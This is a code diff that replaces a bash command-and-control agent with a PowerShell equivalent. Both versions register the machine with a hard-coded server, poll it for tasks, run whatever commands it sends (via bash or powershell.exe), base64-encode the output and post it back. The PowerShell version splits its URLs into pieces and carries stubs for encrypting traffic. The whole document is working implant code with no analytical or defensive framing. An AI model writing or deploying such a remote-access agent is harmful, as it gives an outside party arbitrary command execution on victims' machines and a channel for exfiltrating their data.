@@ -1,37 +1,74 @@
-#!/bin/bash
-ip="192.168.1.2"
-port="8000"
-interface="eth0"
-n=.3
+function shell($fname, $arg){
+    
+    $pinfo                        = New-Object System.Diagnostics.ProcessStartInfo
+    $pinfo.FileName               = $fname
+    $pinfo.RedirectStandardError  = $true
+    $pinfo.RedirectStandardOutput = $true
+    $pinfo.UseShellExecute        = $false
+    $pinfo.Arguments              = $arg
+    $p                            = New-Object System.Diagnostics.Process
+    $p.StartInfo                  = $pinfo
+    
+    $p.Start() | Out-Null
+    $p.WaitForExit()
+    
+    $stdout = $p.StandardOutput.ReadToEnd()
+    $stderr = $p.StandardError.ReadToEnd()
 
-regl="http://$ip:$port/reg/"
+    $res = "VALID $stdout`n$stderr"
+    $res
+}
 
-declare -A data=( [eth]=$interface [hname]=$(hostname) )
 
-name=$(curl -X POST -F eth=$interface -F hname=$(hostname) $regl) 
+$hostname = [System.Net.Dns]::GetHostName()
+$ip   = "192.168.71.142"
+$port = "8000"
+$interface = "eth0"
+# $key  = "REPLACE_KEY"
+$n    = 3
 
-taskl="http://$ip:$port/tasks/$name/"
-resultl="http://$ip:$port/Lin-results/$name/"
+$regl  = ("http" + ':' + "//$ip" + ':' + "$port/reg/")
+$data  = @{
+    eth = "$interface" 
+    hname = "$hostname"
+    }
+    
+$name  = (Invoke-WebRequest -UseBasicParsing -Uri $regl -Body $data -Method 'POST').Content
+#name= SDFCXS
 
-while :
-do  
-	# tasks=0
-    curl $taskl > /tmp/tasks
+$taskl   = ("http" + ':' + "//$ip" + ':' + "$port/tasks/$name/")
+$resultl = ("http" + ':' + "//$ip" + ':' + "$port/results/$name/")
+#http://1.1.1.1:1233/tasks/demo
 
-    # if [ -z "$tasks" ] 
-    splittasks=$(cat /tmp/tasks | tr ";" "\n")
-	while IFS= read -r line 
-	do
-		printf '%s\n' "$line" >> /tmp/tmp
-	done <<< $splittasks
-	cat /tmp/tmp|uniq -u > /tmp/tmps
 
-    cat /tmp/tmps|bash >> /tmp/result
-    base64 /tmp/result > /tmp/enc-result 
-    sleep $n
-    curl -X POST --data "@/tmp/enc-result" $resultl
-    rm /tmp/result
-    rm /tmp/tmp
-	    
-done
+for (;;){
+    
+    $task  = (Invoke-WebRequest -UseBasicParsing -Uri $taskl -Method 'GET').Content
+    #shell dir
+    
+    if (-Not [string]::IsNullOrEmpty($task)){
+        
+        # $task = Decrypt $key $task
+    $task = $task.split()  # task=['VALID','shell','dir']
 
+    
+        $arguments   = $task[0..$task.Length]
+    
+        $f    = "powershell.exe"
+        $arg  = "/c "
+    
+        foreach ($a in $arguments){ $arg += $a + " " }
+
+        $res  = shell $f $arg
+        $Bytes = [System.Text.Encoding]::Unicode.GetBytes($res)
+        $EncodedText =[Convert]::ToBase64String($Bytes)
+        # $res  = Encrypt $key $res
+        # $encodedURL = [System.Web.HttpUtility]::UrlEncode($EncodedText) 
+        $data = @{result = "$EncodedText"}
+        
+        Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST'
+        #http://192.168.71.142:8000/results/GTLBHU/
+
+    # sleep $n
+    }
+}
